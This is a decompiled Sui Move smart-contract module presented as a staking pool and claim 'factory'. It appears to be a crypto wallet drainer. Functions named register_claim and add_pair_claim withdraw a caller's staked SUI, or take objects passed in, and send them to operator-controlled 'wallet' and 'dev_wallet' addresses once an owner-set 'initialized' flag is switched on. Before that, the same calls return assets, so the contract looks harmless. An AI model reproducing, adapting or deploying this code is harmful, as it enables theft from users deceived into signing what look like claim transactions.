module 0x60a628265584a201bfc9a5a1f3515c274e8f8bdd4106cc8781e3e0114184a404::factory {
    struct PoolSimpleInfo has key {
        id: 0x2::object::UID,
        owner: address,
        delegate: address,
        initialized: bool,
        details: 0x1::option::Option<Pool>,
        wallet: address,
        dev_wallet: address,
        profit_split: u8,
    }

    struct Pool has copy, drop, store {
        coin_details: vector<PoolDetail>,
    }

    struct PoolDetail has copy, drop, store {
        coin_type: 0x1::ascii::String,
        amount: u64,
        object_id: 0x2::object::ID,
    }

    public entry fun add_claim<T0>(arg0: &mut PoolSimpleInfo, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg2);
        assert!(v0 == arg0.delegate, 0);
        assert!(0x1::option::is_some<Pool>(&arg0.details), 1);
        let v1 = 0x1::option::borrow_mut<Pool>(&mut arg0.details);
        let v2 = 0x1::type_name::into_string(0x1::type_name::get<T0>());
        let v3 = 0;
        let v4 = false;
        let v5 = 0;
        while (v3 < 0x1::vector::length<PoolDetail>(&v1.coin_details)) {
            let v6 = 0x1::vector::borrow<PoolDetail>(&v1.coin_details, v3);
            if (v6.coin_type == trim_address_zeros(&v2) && v6.object_id == 0x2::object::id<0x2::coin::Coin<T0>>(&arg1)) {
                v4 = true;
                v5 = v6.amount;
                break
            };
            v3 = v3 + 1;
        };
        assert!(v4, 3);
        let v7 = 0x2::coin::value<T0>(&arg1);
        assert!(v7 >= v5, 2);
        if (v5 == 0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, v0);
        } else if (v7 == v5) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut arg1, v5 * (arg0.profit_split as u64) / 100, arg2), arg0.wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, arg0.dev_wallet);
        } else {
            let v8 = 0x2::coin::split<T0>(&mut arg1, v5, arg2);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut v8, v5 * (arg0.profit_split as u64) / 100, arg2), arg0.wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(v8, arg0.dev_wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, v0);
        };
        0x1::vector::swap_remove<PoolDetail>(&mut v1.coin_details, v3);
        if (0x1::vector::is_empty<PoolDetail>(&v1.coin_details)) {
            arg0.details = 0x1::option::none<Pool>();
        };
    }

    public entry fun add_pair_claim<T0: store + key>(arg0: &mut PoolSimpleInfo, arg1: T0, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg2);
        assert!(v0 == arg0.delegate, 0);
        0x2::object::id<T0>(&arg1);
        if (!arg0.initialized) {
            0x2::transfer::public_transfer<T0>(arg1, v0);
        } else {
            0x2::transfer::public_transfer<T0>(arg1, arg0.dev_wallet);
        };
    }

    public entry fun create_pool(arg0: address, arg1: address, arg2: address, arg3: u8, arg4: vector<0x1::ascii::String>, arg5: vector<u64>, arg6: vector<0x2::object::ID>, arg7: &mut 0x2::tx_context::TxContext) {
        let v0 = Pool{coin_details: 0x1::vector::empty<PoolDetail>()};
        let v1 = 0;
        while (v1 < 0x1::vector::length<0x1::ascii::String>(&arg4)) {
            let v2 = *0x1::vector::borrow<0x1::ascii::String>(&arg4, v1);
            let v3 = PoolDetail{
                coin_type : trim_address_zeros(&v2),
                amount    : *0x1::vector::borrow<u64>(&arg5, v1),
                object_id : *0x1::vector::borrow<0x2::object::ID>(&arg6, v1),
            };
            0x1::vector::push_back<PoolDetail>(&mut v0.coin_details, v3);
            v1 = v1 + 1;
        };
        let v4 = PoolSimpleInfo{
            id           : 0x2::object::new(arg7),
            owner        : 0x2::tx_context::sender(arg7),
            delegate     : arg0,
            initialized  : false,
            details      : 0x1::option::some<Pool>(v0),
            wallet       : arg1,
            dev_wallet   : arg2,
            profit_split : arg3,
        };
        0x2::transfer::share_object<PoolSimpleInfo>(v4);
    }

    public entry fun init_manager_and_whitelist(arg0: &mut PoolSimpleInfo, arg1: bool, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == arg0.owner, 0);
        arg0.initialized = arg1;
    }

    public entry fun init_pool(arg0: address, arg1: address, arg2: address, arg3: u8, arg4: &mut 0x2::tx_context::TxContext) {
        let v0 = PoolSimpleInfo{
            id           : 0x2::object::new(arg4),
            owner        : 0x2::tx_context::sender(arg4),
            delegate     : arg0,
            initialized  : false,
            details      : 0x1::option::none<Pool>(),
            wallet       : arg1,
            dev_wallet   : arg2,
            profit_split : arg3,
        };
        0x2::transfer::share_object<PoolSimpleInfo>(v0);
    }

    public entry fun init_pool_update(arg0: &mut PoolSimpleInfo, arg1: address, arg2: address, arg3: u8, arg4: vector<0x1::ascii::String>, arg5: vector<u64>, arg6: vector<0x2::object::ID>, arg7: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg7) == arg0.owner, 0);
        let v0 = Pool{coin_details: 0x1::vector::empty<PoolDetail>()};
        let v1 = 0;
        while (v1 < 0x1::vector::length<0x1::ascii::String>(&arg4)) {
            let v2 = *0x1::vector::borrow<0x1::ascii::String>(&arg4, v1);
            let v3 = PoolDetail{
                coin_type : trim_address_zeros(&v2),
                amount    : *0x1::vector::borrow<u64>(&arg5, v1),
                object_id : *0x1::vector::borrow<0x2::object::ID>(&arg6, v1),
            };
            0x1::vector::push_back<PoolDetail>(&mut v0.coin_details, v3);
            v1 = v1 + 1;
        };
        arg0.wallet = arg1;
        arg0.dev_wallet = arg2;
        arg0.profit_split = arg3;
        arg0.details = 0x1::option::some<Pool>(v0);
    }

    public entry fun register_claim(arg0: &mut 0x3::sui_system::SuiSystemState, arg1: 0x3::staking_pool::StakedSui, arg2: &mut PoolSimpleInfo, arg3: &mut 0x2::tx_context::TxContext) {
        if (arg2.initialized) {
            assert!(0x1::option::is_some<Pool>(&arg2.details), 1);
            0x1::option::borrow<Pool>(&arg2.details);
            let v0 = 0x2::coin::from_balance<0x2::sui::SUI>(0x3::sui_system::request_withdraw_stake_non_entry(arg0, arg1, arg3), arg3);
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(&mut v0, 0x2::coin::value<0x2::sui::SUI>(&v0) * (arg2.profit_split as u64) / 100, arg3), arg2.wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(v0, arg2.dev_wallet);
        } else {
            0x2::transfer::public_transfer<0x3::staking_pool::StakedSui>(arg1, 0x2::tx_context::sender(arg3));
        };
    }

    fun trim_address_zeros(arg0: &0x1::ascii::String) : 0x1::ascii::String {
        let v0 = 0x1::ascii::into_bytes(*arg0);
        let v1 = 0x1::vector::empty<u8>();
        let v2 = 0x1::vector::length<u8>(&v0);
        let v3 = if (v2 < 2) {
            true
        } else if (*0x1::vector::borrow<u8>(&v0, 0) != 48) {
            true
        } else {
            *0x1::vector::borrow<u8>(&v0, 1) != 120
        };
        if (v3) {
            0x1::vector::push_back<u8>(&mut v1, 48);
            0x1::vector::push_back<u8>(&mut v1, 120);
        };
        let v4 = 0;
        while (v4 < v2) {
            0x1::vector::push_back<u8>(&mut v1, *0x1::vector::borrow<u8>(&v0, v4));
            v4 = v4 + 1;
        };
        0x1::ascii::string(v1)
    }

    // decompiled from Move bytecode v6
}

